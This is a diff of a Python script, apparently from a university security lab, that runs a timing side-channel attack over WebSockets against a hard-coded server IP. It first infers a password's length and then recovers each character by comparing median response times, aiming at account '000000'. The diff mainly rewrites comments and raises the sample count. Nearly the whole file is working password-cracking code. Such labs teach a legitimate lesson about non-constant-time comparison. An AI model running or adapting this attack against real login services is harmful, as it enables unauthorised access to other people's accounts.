@@ -6,61 +6,76 @@ import statistics
 from json import dumps, loads
 from time import sleep
 
-# --- SERVER CONNECTION LOGIC (From client.py) ---
+# --- SERVER CONNECTION LOGIC ---
 
 async def client_connect(username, password, variance=0.001):
-    """Handles sending and receiving logins to & from the server[cite: 28]."""
+    """
+    Asynchronously connects to the remote server via WebSockets.
+    Sends the login credentials and returns the server's response.
+    """
     server_address = "ws://20.224.193.77:8080"
     while True:
         try:
             async with websockets.connect(server_address) as websocket:
+                # Send credentials as a JSON list
                 await websocket.send(dumps([username, password, variance]))
+                # Wait for the server to say if login was successful
                 reply = await websocket.recv()
                 return loads(reply)
         except Exception:
+            # If connection fails (e.g., server busy), wait 1 second and try again
             await asyncio.sleep(1)
 
 def call_server(username, password):
-    """Makes use of client_connect and can be called directly[cite: 29]."""
+    """
+    A wrapper function that runs the asynchronous connection in a 
+    standard synchronous way. Includes a tiny delay to avoid 
+    overloading the server.
+    """
     reply = asyncio.run(client_connect(username, password))
-    # Mandatory sleep to prevent server DDoS[cite: 33, 34].
+    # Small sleep to respect server limits and avoid being blocked
     sleep(0.001) 
     return reply
 
 # --- ATTACK LOGIC ---
 
-# The password consists only of lowercase letters and digits[cite: 23, 52].
+# The list of all possible characters we will test (a-z and 0-9)
 CHARSET = string.ascii_lowercase + string.digits 
 
-def get_stable_time(student_number, password, samples=60):
+def get_stable_time(student_number, password, samples=80):
     """
-    Measures response time between sending credentials and receiving a response[cite: 41].
-    Uses the median to filter out variable network delay.
+    Measures how many seconds the server takes to process a login attempt.
+    To ignore 'lag' or network spikes, it tries (samples) times and takes the 
+    median (middle) value as the most accurate measurement.
     """
     times = []
     for _ in range(samples):
-        start = time.perf_counter()
+        start = time.perf_counter()  # Start the stopwatch
         call_server(student_number, password)
-        end = time.perf_counter()
+        end = time.perf_counter()    # Stop the stopwatch
         times.append(end - start)
+    
+    # Return the most consistent time found
     return statistics.median(times)
 
 def find_password_length(student_number):
     """
-    Measures response times of passwords of different lengths to determine the correct one[cite: 44].
+    Determines the password length by testing lengths 1 through 20.
+    In many systems, checking a longer string takes slightly more time,
+    or the server exits early if the length is wrong.
     """
     print("Step 1: Determining password length...")
     results = []
     
-    # Testing lengths from 1 to 20[cite: 44].
     for length in range(1, 21):
-        # We use a dummy string to test the length.
+        # Create a dummy password of the current length (e.g., 'aaaaa')
         test_pw = "a" * length
-        t = get_stable_time(student_number, test_pw, samples=60)
+        t = get_stable_time(student_number, test_pw, samples=80)
         results.append((t, length))
         print(f"  Length {length:02}: {t:.5f}s")
     
-    # The correct length results in the longest execution time[cite: 19].
+    # Sort results by time (descending). The length with the LONGEST 
+    # response time is usually the correct one.
     results.sort(reverse=True)
     best_length = results[0][1]
     print(f">> Detected Length: {best_length}\n")
@@ -68,26 +83,32 @@ def find_password_length(student_number):
 
 def crack_password(student_number):
     """
-    Cracks the password character by character[cite: 51].
+    The main attack loop. Once the length is known, it tests every 
+    possible character for position 1, then position 2, and so on.
     """
-    # First, the script figures out the length by itself.
+    # First, find out how long the password is
     length = find_password_length(student_number)
+    # Start with a baseline password (all 'a's)
     current_pw = list("a" * length)
     
     print(f"Step 2: Cracking characters for {student_number}...")
     
     for i in range(length):
         char_results = []
+        # Try every character in our CHARSET (a, b, c... 8, 9)
         for char in CHARSET:
             current_pw[i] = char
             test_str = "".join(current_pw)
-            t = get_stable_time(student_number, test_str, samples=60)
+            t = get_stable_time(student_number, test_str, samples=80)
             char_results.append((t, char))
         
-        # The character that causes the longest delay is correct[cite: 19].
+        # In a timing attack, the server compares the password character 
+        # by character. If the first character is correct, it moves to 
+        # the second, which takes a few microseconds LONGER.
         char_results.sort(reverse=True)
         best_char = char_results[0][1]
         
+        # Lock in the 'slowest' character and move to the next position
         current_pw[i] = best_char
         print(f"  Pos {i}: '{best_char}' -> Current: {''.join(current_pw)}")
     
@@ -96,6 +117,6 @@ def crack_password(student_number):
     return final_password
 
 if __name__ == "__main__":
-    # Test with student 000000 (hunter2) or your own student ID[cite: 54].
+    # Start the process for the target account
     target_student = "000000" 
     crack_password(target_student)
